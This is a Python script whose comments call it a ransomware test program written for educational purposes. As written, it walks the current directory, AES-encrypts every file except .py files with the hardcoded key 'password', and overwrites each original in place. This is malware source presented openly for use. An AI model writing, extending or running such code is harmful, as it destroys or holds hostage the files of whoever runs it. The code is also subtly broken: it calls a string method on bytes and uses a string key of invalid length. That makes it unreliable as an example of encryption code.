# This is a test application to write a ransomware program in python
# it is not intended to be used maliciously and just for educational purposes
#
# the program will take the current directory and encrypt all files in it

import os
import sys
import hashlib
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad
from base64 import b64encode, b64decode


class Encryption:
    def encrypt(message, key):
        iv = get_random_bytes(AES.block_size)
        cipher = AES.new(key, AES.MODE_CBC, iv)
        return b64encode(iv + cipher.encrypt(pad(message.encode('utf-8'), AES.block_size)))

    def decrypt(ciphertext, key):
        iv = b64decode(ciphertext)
        cipher = AES.new(key, AES.MODE_CBC, iv[:AES.block_size])
        return unpad(cipher.decrypt(
            iv[AES.block_size:]), AES.block_size)


class FileReader:
    def decrypt_file(file_name, key):
        with open(file_name, 'rb') as fo:
            ciphertext = fo.read()
        return Encryption.decrypt(ciphertext, key)

    def encrypt_file(file_name, key):
        with open(file_name, 'rb') as fo:
            plaintext = fo.read()
        return Encryption.encrypt(plaintext, key)


# Get the current working directory
cwd = os.getcwd()

# Get the list of files in the current working directory
files = os.listdir(cwd)

# Loop through the files and encrypt them
for file in files:
    # Get the file name
    file_name = os.path.join(cwd, file)
    # Get the file extension
    file_ext = os.path.splitext(file_name)[1]
    # Check if the file is a file and not a directory
    if os.path.isfile(file_name):
        # Check if the file is a python file
        if file_ext != '.py':
            # Encrypt the file
            encrypted_file = FileReader.encrypt_file(file_name, 'password')
            # Write the encrypted file
            with open(file_name, 'wb') as fo:
                fo.write(encrypted_file)
